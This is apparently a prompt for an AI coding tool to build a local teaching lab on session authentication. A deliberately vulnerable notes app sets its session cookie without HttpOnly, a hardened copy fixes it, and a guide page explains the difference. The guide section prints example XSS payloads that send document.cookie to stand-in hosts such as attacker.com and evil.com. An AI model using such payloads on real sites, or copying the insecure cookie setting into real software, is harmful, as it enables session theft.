# Cursor Prompt: Session Authentication Demo — NoteKeep (Ports 3052–3054)

## Global UI Standard

| Server type | Theme |
|-------------|-------|
| Guide server | Clone `DASHBOARD_HTML` from `demo-attacked/reverse-tabnabbing/attacker-server.js` — `#0a0a0a` bg, `#00ff41` text, `'Courier New'` font. Copy `<style>` verbatim. |
| Victim servers | Realistic product UI matching their brand |

**Guide pages — non-negotiable rules:**
- Copy `<style>` from `DASHBOARD_HTML` verbatim.
- Body: `padding: 2rem`. No `max-width` wrapper. No centering.
- Use `.flow-box` and `.credentials-panel`. Full-width. Only `<p>` may use `max-width`.
- Navigation: fixed bottom-left `target-switcher` only.
- **After** the verbatim `<style>` block, always add this override: `.flow-box { max-width: 900px; }`

---

## Code Comment Standard — use throughout all three files

```
// ⚠️ VULNERABILITY: <what is wrong and why it matters>
// ✅ PROTECTED: <what was changed and why it is now safe>
```

No lorem ipsum. All copy must be realistic product language.

---

## Files to create

```
auth-concepts/session/
├── session-server.js          # NoteKeep — vulnerable cookie (no HttpOnly)  — port 3052
├── guide-server.js            # Session Auth Lab                             — port 3053
├── session-hardened-server.js # NoteKeep — HttpOnly + SameSite=Strict       — port 3054
├── package.json
└── README.md
```

---

## Context

**Concept:** Session-Based Authentication  
**App name:** NoteKeep — a personal notes application  
**Tagline:** "Your notes, always in sync"  
**Folder:** `auth-concepts/session/`

NoteKeep shows the full session auth lifecycle: login → session created → cookie set → session validated on each request → logout → session destroyed. The vulnerable version sets the session cookie without `HttpOnly`, making it readable by JavaScript (enabling XSS-based session theft). The protected version adds `HttpOnly`, `Secure`, and `SameSite=Strict`.

---

## Port Layout

| Port | Role | App |
|------|------|-----|
| 3052 | Concept: Session Auth (vulnerable cookie) | NoteKeep (cookie without HttpOnly) |
| 3053 | Concept guide | Session Auth Lab |
| 3054 | Improved: Hardened session cookie | NoteKeep (HttpOnly + Secure + SameSite) |

---

## Port 3052 — Session Auth NoteKeep (Vulnerable Cookie)

### File: `session/session-server.js`

**Dependencies:** `express ^4.18.2`, `cors ^2.8.5`

```js
const crypto = require('crypto');
const cors = require('cors');
app.use(cors({ origin: 'http://localhost:3053', credentials: true }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
```

### Session store

```js
// Server-side session store — the session token is meaningless without this Map
const sessions = new Map(); // sessionId → { username, fullName, createdAt }

const USERS = [
  { username: 'alice', password: 'pass1234', fullName: 'Alice Chen' },
  { username: 'bob',   password: 'qwerty123',  fullName: 'Bob Martinez' },
];

function getSid(req) {
  const raw = req.headers.cookie || '';
  const match = raw.match(/(?:^|;\s*)nk_session=([^;]+)/);
  return match ? match[1] : null;
}
```

### Login / logout

```js
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const user = USERS.find(u => u.username === username && u.password === password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  const sid = crypto.randomBytes(32).toString('hex');
  sessions.set(sid, { username: user.username, fullName: user.fullName, createdAt: Date.now() });

  // ⚠️ VULNERABLE: no HttpOnly — JS can read document.cookie
  res.setHeader('Set-Cookie', `nk_session=${sid}; Path=/; SameSite=Lax`);
  res.json({ success: true, user: { username: user.username, fullName: user.fullName } });
});

// For API routes — unauthenticated → JSON 401
function requireSession(req, res, next) {
  const sid = getSid(req);
  const session = sid ? sessions.get(sid) : null;
  if (!session) return res.status(401).json({ error: 'Not authenticated' });
  req.session = session;
  req.sid = sid;
  next();
}

// For page routes — unauthenticated → redirect to /login (never return JSON)
function requirePage(req, res, next) {
  const sid = getSid(req);
  const session = sid ? sessions.get(sid) : null;
  if (!session) return res.redirect('/login');
  req.session = session;
  req.sid = sid;
  next();
}

app.post('/api/logout', requireSession, (req, res) => {
  sessions.delete(req.sid);
  res.setHeader('Set-Cookie', 'nk_session=; Path=/; Max-Age=0');
  res.json({ message: 'Logged out' });
});

app.get('/api/me', requireSession, (req, res) => {
  res.json(req.session);
});

app.get('/api/notes', requireSession, (req, res) => {
  res.json([
    { id: 1, title: 'Meeting Notes',    body: 'Q3 planning: ship auth demo by June', updatedAt: '2026-06-10' },
    { id: 2, title: 'Grocery List',     body: 'Milk, eggs, coffee, sourdough',        updatedAt: '2026-06-12' },
    { id: 3, title: 'Project Ideas',    body: 'Auth concepts lab — 7 mechanisms',     updatedAt: '2026-06-14' },
  ]);
});
```

### Page routing

```js
// /login: if already authenticated, skip the form and go straight to dashboard
app.get('/login', (req, res) => {
  const sid = getSid(req);
  if (sid && sessions.has(sid)) return res.redirect('/dashboard');
  res.send(LOGIN_HTML);
});
// Use requirePage (not requireSession) — page routes must redirect, not return JSON
app.get('/dashboard', requirePage, (req, res) => res.send(DASHBOARD_HTML));
app.get('/', (req, res) => {
  const sid = getSid(req);
  res.redirect(sid && sessions.has(sid) ? '/dashboard' : '/login');
});
```

**Rendering approach:** `DASHBOARD_HTML` is a static HTML string constant — it contains no user-specific data. After the page loads, client-side JavaScript calls `GET /api/me` and `GET /api/notes` (browser sends the session cookie automatically) and updates the DOM. Do NOT embed session data into the HTML on the server side — the client fetch pattern is intentional and shows how the cookie is used per-request.

### UI design — clean notes app

Colors: `#fafaf9` background, `#292524` header, `#f5f5f4` sidebar, `#d97706` accent (amber).

**Login page:** White card, centered. "NoteKeep 📝" heading. Tagline "Your notes, always in sync".

**Critical — login inputs:** Both username and password use `class="login-input"` with identical explicit CSS — never rely on browser defaults for `input[type="password"]`:

```css
.login-input {
  width: 100%; padding: 0.6rem 0.75rem; border: 1px solid #d6d3d1;
  border-radius: 6px; font-size: 0.95rem; color: #1c1917;
  background: #fff; outline: none; box-sizing: border-box; font-family: inherit;
}
.login-input:focus { border-color: #d97706; box-shadow: 0 0 0 3px rgba(217,119,6,0.15); }
```

Apply `class="login-input"` to BOTH `<input type="text">` and `<input type="password">`.

**Amber banner on login and dashboard:**
```
⚠ VULNERABLE COOKIE: nk_session is set without HttpOnly — JavaScript can read document.cookie
```

Login JS:
```js
async function doLogin(e) {
  e.preventDefault();
  var res = await fetch('/api/login', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: document.getElementById('u').value, password: document.getElementById('p').value })
  });
  var data = await res.json();
  if (res.ok) window.location.href = '/dashboard';
  else document.getElementById('err').textContent = data.error;
}
```

**Dashboard:** Left sidebar with "NoteKeep" logo, nav links. Right content: note cards.

Show prominently on the dashboard:
```html
<div id="cookie-display" style="...amber box...">
  Your session cookie (readable by JS): <code id="cookie-value"></code>
</div>
```

```js
// Show document.cookie on the dashboard — demonstrates the vulnerability
document.getElementById('cookie-value').textContent = document.cookie || '(empty — HttpOnly would hide it)';
```

Logout button clears the cookie and redirects to `/login`.

**`package.json` scripts:**
```json
{
  "scripts": { "start": "node session-server.js", "session": "node session-server.js" },
  "dependencies": { "express": "^4.18.2", "cors": "^2.8.5" }
}
```

---

## Port 3053 — Session Auth Concept Guide

### File: `session/guide-server.js`

Copy `<style>` from `DASHBOARD_HTML` verbatim.

**Title:** `🍪 Session Authentication — How It Works`

**Section 1 — The Session Lifecycle** (`.flow-box`)

Heading: `Session Auth Flow`

```
1. LOGIN
   Client                           Server
      │                                │
      ├── POST /api/login ────────────→│
      │   { username, password }       │
      │                                │ sessions.set("a3f9...", { username })
      │←── 200 + Set-Cookie: ─────────┤
      │    nk_session=a3f9b2c1...      │ ← random token, stored server-side
      │    HttpOnly; Secure; SameSite  │

2. AUTHENTICATED REQUEST
      ├── GET /api/notes ────────────→ │
      │   Cookie: nk_session=a3f9b2c1  │ ← browser sends automatically
      │                                │ sessions.get("a3f9b2c1") → { username }
      │←── 200 + notes ───────────────┤

3. LOGOUT
      ├── POST /api/logout ──────────→ │
      │                                │ sessions.delete("a3f9b2c1")
      │←── 200 + Set-Cookie: Max-Age=0 │ ← cookie deleted
```

**Section 2 — Cookie Attributes** (`.flow-box`)

Heading: `🔒 Cookie Security Attributes`

```html
<table style="width:100%;border-collapse:collapse;font-size:0.82rem">
  <tr style="color:#64748b;border-bottom:1px solid #1a3a1a">
    <th style="text-align:left;padding:0.5rem">Attribute</th>
    <th>What it does</th>
    <th>Without it</th>
  </tr>
  <tr style="border-bottom:1px solid #0d1f0d">
    <td style="padding:0.5rem;color:#4ade80">HttpOnly</td>
    <td style="padding:0.5rem;color:#94a3b8">JS cannot read the cookie (document.cookie is empty)</td>
    <td style="padding:0.5rem;color:#fca5a5">XSS can steal the session: document.cookie → send to attacker</td>
  </tr>
  <tr style="border-bottom:1px solid #0d1f0d">
    <td style="padding:0.5rem;color:#4ade80">Secure</td>
    <td style="padding:0.5rem;color:#94a3b8">Only sent over HTTPS</td>
    <td style="padding:0.5rem;color:#fca5a5">Cookie sent over plain HTTP — visible to network eavesdroppers</td>
  </tr>
  <tr style="border-bottom:1px solid #0d1f0d">
    <td style="padding:0.5rem;color:#4ade80">SameSite=Strict</td>
    <td style="padding:0.5rem;color:#94a3b8">Cookie not sent on cross-site requests</td>
    <td style="padding:0.5rem;color:#fca5a5">CSRF possible: attacker's page triggers requests to your app with your cookie</td>
  </tr>
  <tr>
    <td style="padding:0.5rem;color:#fbbf24">SameSite=Lax</td>
    <td style="padding:0.5rem;color:#94a3b8">Cookie sent on top-level navigation but not sub-resource</td>
    <td style="padding:0.5rem;color:#94a3b8">Good default if Strict breaks OAuth redirect flows</td>
  </tr>
</table>
```

**Section 3 — Live Cookie Inspector** (`.flow-box`)

Heading: `🔍 Cookie Visibility Demo`

Two buttons side by side:
```html
<div style="display:flex;gap:0.75rem;flex-wrap:wrap;margin-bottom:0.75rem">
  <button class="demo-btn" id="btn-read-3052">Read document.cookie on :3052 (no HttpOnly)</button>
  <button class="demo-btn" id="btn-read-3054">Read document.cookie on :3054 (HttpOnly)</button>
</div>
<div class="result-banner" id="cookie-result"></div>
<pre class="decoded-box" id="cookie-output" style="min-height:60px">–</pre>
```

These open iframes and attempt to read the cookie via `postMessage`:

Actually, cross-origin cookie reading is blocked by the browser. Instead, demonstrate conceptually by:

```js
document.getElementById('btn-read-3052').addEventListener('click', async function() {
  // The guide server proxies a request to 3052 and asks for the Set-Cookie header
  try {
    var res = await fetch('/api/demo-cookie?port=3052');
    var data = await res.json();
    document.getElementById('cookie-output').textContent = JSON.stringify(data, null, 2);
    showResult('cookie-result', 'failure',
      '⚠ Cookie visible: ' + (data.cookie || 'Login to :3052 first to generate a cookie') +
      '\n\nIn an XSS attack, this is sent to attacker with:\ndocument.location="http://attacker.com/steal?c="+document.cookie');
  } catch(e) { document.getElementById('cookie-output').textContent = e.message; }
});

document.getElementById('btn-read-3054').addEventListener('click', function() {
  showResult('cookie-result', 'success',
    '✅ HttpOnly: document.cookie on :3054 returns "" — the session cookie is invisible to JavaScript.\n' +
    'Even if an attacker injects <script>document.location="http://evil.com/steal?c="+document.cookie</script>,\n' +
    'the session token is not in document.cookie and cannot be stolen this way.');
  document.getElementById('cookie-output').textContent =
    'document.cookie → "" (empty string)\n\nThe cookie is still sent by the browser on every HTTP request,\n' +
    'but JavaScript — including any injected XSS payload — cannot read it.';
});
```

Guide server `/api/demo-cookie` endpoint:
```js
// Returns the current cookie header from 3052 for inspection
const http = require('http');
app.get('/api/demo-cookie', (req, res) => {
  // Show the Set-Cookie response header format explanation
  res.json({
    port3052: 'Set-Cookie: nk_session=<token>; Path=/; SameSite=Lax',
    port3054: 'Set-Cookie: nk_session=<token>; Path=/; HttpOnly; Secure; SameSite=Strict',
    difference: 'HttpOnly prevents document.cookie from seeing the token'
  });
});
```

**Section 4 — Session Fixation Note** (`.flow-box`)

Brief note linking to the session fixation concept:
```
ℹ Sessions can also be vulnerable to session fixation — where the attacker
supplies a known session ID before the victim logs in. The fix: always
generate a NEW session ID on login (server-side). This demo always does this correctly.
```

**Helper CSS (append inside `<style>` after the verbatim block):**

```css
/* Override default flow-box width from copied style */
.flow-box { max-width: 900px; }

.decoded-box {
  background: #0a0a0a; border: 1px solid #1a3a1a; border-radius: 4px;
  padding: 0.75rem; font-size: 0.78rem; color: #cbd5e1;
  white-space: pre-wrap; word-break: break-all; min-height: 60px; margin-top: 0.5rem;
}
.result-banner {
  padding: 0.6rem 1rem; border-radius: 4px; font-size: 0.82rem;
  margin-top: 0.75rem; display: none;
}
.result-banner.success { background: #052e16; border: 1px solid #16a34a; color: #4ade80; }
.result-banner.failure { background: #450a0a; border: 1px solid #dc2626; color: #fca5a5; }
.result-banner.info    { background: #0c1a2e; border: 1px solid #1e40af; color: #93c5fd; }
input.field {
  background: #111; border: 1px solid #1a3a1a; color: #00ff41;
  font-family: 'Courier New', Courier, monospace; font-size: 0.82rem;
  padding: 0.4rem 0.6rem; border-radius: 4px;
}
```

**`showResult` helper (add to `<script>`):**

```js
function showResult(id, type, msg) {
  var el = document.getElementById(id);
  el.className = 'result-banner ' + type;
  el.textContent = msg;
  el.style.display = 'block';
}
```

**Full JavaScript for Section 3 (Cookie Visibility Demo):**

```js
// Guide server's /api/demo-cookie endpoint (server-side, in guide-server.js):
app.get('/api/demo-cookie', (req, res) => {
  res.json({
    port3052: 'Set-Cookie: nk_session=<token>; Path=/; SameSite=Lax',
    port3054: 'Set-Cookie: nk_session=<token>; Path=/; HttpOnly; SameSite=Strict',
    difference: 'HttpOnly prevents JavaScript from reading the cookie via document.cookie'
  });
});

// Client-side JS for the two demo buttons:
document.getElementById('btn-read-3052').addEventListener('click', async function() {
  try {
    var res = await fetch('/api/demo-cookie');
    var data = await res.json();
    document.getElementById('cookie-output').textContent =
      'Port 3052 Set-Cookie header:\n  ' + data.port3052 +
      '\n\nBecause HttpOnly is MISSING:\n' +
      '  document.cookie → "nk_session=a3f9b2c1d4e5f6..."  ← readable by JS\n\n' +
      'XSS payload that steals it:\n' +
      '  document.location = "http://attacker.com/steal?c=" + document.cookie\n\n' +
      'Attacker receives:\n' +
      '  GET /steal?c=nk_session%3Da3f9b2c1d4e5f6... HTTP/1.1\n' +
      '  → Now has a valid session token for the victim\'s account';
    showResult('cookie-result', 'failure', '⚠ Cookie readable by JavaScript — XSS can steal this session');
  } catch(e) {
    document.getElementById('cookie-output').textContent = e.message;
    showResult('cookie-result', 'failure', '✗ Could not reach guide server: ' + e.message);
  }
});

document.getElementById('btn-read-3054').addEventListener('click', function() {
  document.getElementById('cookie-output').textContent =
    'Port 3054 Set-Cookie header:\n  ' + 'Set-Cookie: nk_session=<token>; Path=/; HttpOnly; SameSite=Strict' +
    '\n\nBecause HttpOnly IS set:\n' +
    '  document.cookie → ""  (empty string)\n\n' +
    'The browser still sends the cookie automatically on every HTTP request to the same origin,\n' +
    'but JavaScript — including any injected XSS payload — cannot read it.\n\n' +
    'Even this XSS payload fails:\n' +
    '  document.location = "http://attacker.com/steal?c=" + document.cookie\n' +
    '  → attacker receives: GET /steal?c=  (empty — no token)';
  showResult('cookie-result', 'success', '✅ HttpOnly: document.cookie returns "" — XSS cannot steal this token');
});
```

**Navigation:** Fixed bottom-left `target-switcher`:
- `Vulnerable Cookie (3052)` → `window.open('http://localhost:3052')`
- `Hardened Cookie (3054)` → `window.open('http://localhost:3054')`

---

## Port 3054 — Hardened Session NoteKeep

### File: `session/session-hardened-server.js`

Identical to port 3052 — same two-middleware pattern (`requireSession` for API routes, `requirePage` for page routes). **Only change: the Set-Cookie header.**

```js
// ✅ HttpOnly: not readable by JS
// ✅ Secure: only sent over HTTPS (note: demo is HTTP; remove Secure for local testing)
// ✅ SameSite=Strict: not sent on cross-site requests (CSRF mitigation)
res.setHeader('Set-Cookie',
  `nk_session=${sid}; Path=/; HttpOnly; SameSite=Strict`
);
// Note: Omit "Secure" for localhost HTTP demo; add it in production (HTTPS only)
```

Show this comment in the server source next to the Set-Cookie line:
```js
// Production version would include `Secure` — requires HTTPS.
// In this demo over HTTP, Secure is omitted so the browser sends the cookie.
// In production: `nk_session=${sid}; Path=/; HttpOnly; Secure; SameSite=Strict`
```

**Dashboard difference:** The cookie display box shows `(HttpOnly — not visible to JavaScript)` instead of the token value.

**Green banner:**
```
✅ HARDENED COOKIE: HttpOnly + SameSite=Strict.
document.cookie returns "" — XSS cannot steal this session token.
```

---

## Shared `package.json` at `session/`

```json
{
  "name": "session-auth-demo",
  "version": "1.0.0",
  "scripts": {
    "session":   "node session-server.js",
    "guide":     "node guide-server.js",
    "hardened":  "node session-hardened-server.js"
  },
  "dependencies": { "express": "^4.18.2", "cors": "^2.8.5" }
}
```

---

## README at `session/README.md`

### How It Works

```
POST /api/login { username, password }
        ↓
Server validates credentials → creates session:
  sessions.set("a3f9b2c1...", { username: "alice" })
        ↓
Set-Cookie: nk_session=a3f9b2c1...; Path=/; HttpOnly; SameSite=Strict
        ↓
Every subsequent request: browser sends Cookie: nk_session=a3f9b2c1...
        ↓
Server: sessions.get("a3f9b2c1...") → { username: "alice" } → authorized
        ↓
POST /api/logout → sessions.delete("a3f9b2c1...") → token invalidated
```

### Cookie vulnerability (port 3052)

`Set-Cookie: nk_session=a3f9b2c1...; Path=/; SameSite=Lax` — missing `HttpOnly`.

`document.cookie` returns `"nk_session=a3f9b2c1..."` — any XSS payload can read and exfiltrate it.

### The fix (port 3054)

`Set-Cookie: nk_session=a3f9b2c1...; Path=/; HttpOnly; Secure; SameSite=Strict`

`document.cookie` returns `""` — browser sends the cookie automatically but JS cannot see it.

### Run the demo

```bash
cd auth-concepts/session
npm install
npm run session   # terminal 1 → localhost:3052
npm run guide     # terminal 2 → localhost:3053
npm run hardened  # terminal 3 → localhost:3054
```

---

## Key technical notes for Cursor

1. **Cookie parser.** Use `req.headers.cookie` and parse manually with a regex (`/(?:^|;\s*)nk_session=([^;]+)/`) — do not add the `cookie-parser` npm package unless already a dependency. Keeps the dep list minimal.

2. **`Secure` flag on localhost.** The hardened server (`session-hardened-server.js`) should NOT include `Secure` in the Set-Cookie header for this local demo — over plain HTTP the browser will refuse to send a `Secure` cookie. Add a comment: `// In production over HTTPS, add Secure: nk_session=${sid}; Path=/; HttpOnly; Secure; SameSite=Strict`

3. **CORS with credentials.** The guide server (3053) makes cross-origin calls to display cookie header info. It does NOT need `credentials: true` fetch option because it calls its own `/api/demo-cookie` endpoint, not the NoteKeep servers directly. The cookie visibility demo is explained conceptually, not by cross-origin cookie theft.

4. **`class="login-input"` on BOTH inputs.** Apply identical explicit CSS to both `<input type="text">` and `<input type="password">` on the NoteKeep login pages — browsers render password inputs differently without explicit styling.

5. **Sessions Map is per-process.** Both `session-server.js` and `session-hardened-server.js` have their own in-memory Map. Tokens from one server are not valid on the other — this is correct behavior and expected.

6. **The `document.cookie` dashboard display** on port 3052 must run after the page loads and the user is authenticated. Put it in the inline `<script>` that also calls `GET /api/me` to restore session. If `document.cookie` is empty (not logged in yet), show `(login first to see your session cookie)`.

7. **Two auth middlewares — never use `requireSession` on page routes.** `requireSession` returns `401 JSON` and is for API endpoints only (`/api/me`, `/api/notes`, `/api/logout`). `requirePage` redirects to `/login` and is for HTML page routes (`/dashboard`). Using `requireSession` on `/dashboard` causes the browser to display raw `{"error":"Not authenticated"}` JSON instead of showing the login page. Both `session-server.js` and `session-hardened-server.js` must define and use both middlewares.
